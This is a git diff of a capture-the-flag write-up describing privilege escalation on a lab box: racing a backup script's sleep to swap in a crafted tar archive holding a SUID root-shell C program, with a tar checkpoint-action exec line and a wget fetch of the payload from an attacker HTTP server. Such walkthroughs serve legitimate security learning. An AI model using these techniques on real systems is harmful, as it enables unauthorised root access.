@@ -247,20 +247,8 @@ sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exe
 
 + In **backuperer** binary file, when the backup is being created, the script sleeps 30 seconds before it executes the rest of the commands. Use 30 seconds to replace the backup tar file that the script created with our own malicious file. After 30 seconds, it will create a directory called "check" and decompress our malicious backup tar file there. Then it will go through the integrity check and fail, thereby giving us 5 minutes before the next scheduled task is run, to escalate privileges. Once the 5 minutes are up, the backuperer program is run again and our files get deleted.
 
-+ Create a **/var/www/html** directory in your current directory **/home/onuma**: `mkdir -p var/www/html`
++ Create a **/var/www/html** directory in your kali  attack vm: `mkdir -p var/www/html`
 + Create your own compressed file **setuid.c** that contains a SUID executable to escalate privileges.
-```
-#include <stdio.h>
-#include <stdlib.h>
-#include <sys/types.h>
-#include <unistd.h>
-
-int main(void) {
-    setuid(0); setgid(0); system("/bin/bash");
-}
-```
-
-+ **Alternatively**,
 ```
 #include <unistd.h>
 int main()
@@ -276,17 +264,23 @@ int main()
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/978f3a19-e39f-4815-bc2b-5677fbea21e7)
 
-+ Try compile one more time again, and `chmod u+s setuid`.
++ Try to compile one more time again, and `chmod u+s setuid`.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c42190b6-ca36-424f-bd71-e58bfa37ebdc)
 
-+ Transfer it into **/home/onuma/var/www/html** on the target.
++ Transfer it into **/var/tmp** on the target.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/71ba51ab-d3a0-4d70-8d18-65cbf7d5512d)
 
 + Compress the **var** directory, and save it to the file called **exploit**: `tar -zcvf exploit var`
-+ copy to our target machine in /var/tmp
++ Transfer it into the target machine in **/var/tmp**
+```
+sudo python3 -m http.server
+wget http://10.10.14.2:8000/exploit
+```
 
++ `systemctl list-timers`
++ `cp exploit `
 
 
 # References & Alternatives
